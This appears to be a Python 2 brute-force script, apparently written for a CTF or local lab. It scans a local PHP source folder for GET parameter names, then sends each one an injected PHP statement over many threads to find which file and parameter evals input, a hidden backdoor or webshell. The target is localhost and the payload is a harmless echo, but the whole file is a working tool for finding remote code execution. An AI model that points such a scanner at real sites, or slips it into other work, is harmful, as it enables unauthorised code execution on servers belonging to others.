import os
import time
import requests
import threading

base_url = "http://localhost:801/src/"
base_dir = "D:\\phpStudy\\PHPTutorial\\WWW\\src\\"
payload = "echo 'tinmin cool';"
file_list = os.listdir(base_dir)
def phparg(f):
    gets = []
    fa = open(base_dir+f,'r')
    lines = fa.readlines()
    for line in lines:
        if line.find("$_GET['") >= 0:
            start = line.find("$_GET['") + len("$_GET['")
            stop = line.find("']")
            gets.append(line[start:stop])
    return gets

def exp(start,stop):
    f = file_list[start:stop]
    for file in f:
        print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+" try %s"%file)
        for pl in phparg(file):
            #now_url = base_url+file+"?"+pl+"="+payload
            #print base_url+file+"?"+pl+"="+payload
            r = requests.get(base_url+file+"?"+pl+"="+payload)
            if 'tinmin cool' in r.content:
                print 'pwd is: %s filename is %s'%(pl,file)
                exit()
                break
                

def main():

    for i in range(0,len(file_list),len(file_list)/15):
        #print file_list[i:i+len(file_list)/15]
        threading.Thread(target=exp,args=(i,i+len(file_list)/15)).start()


if __name__ == "__main__":
    main()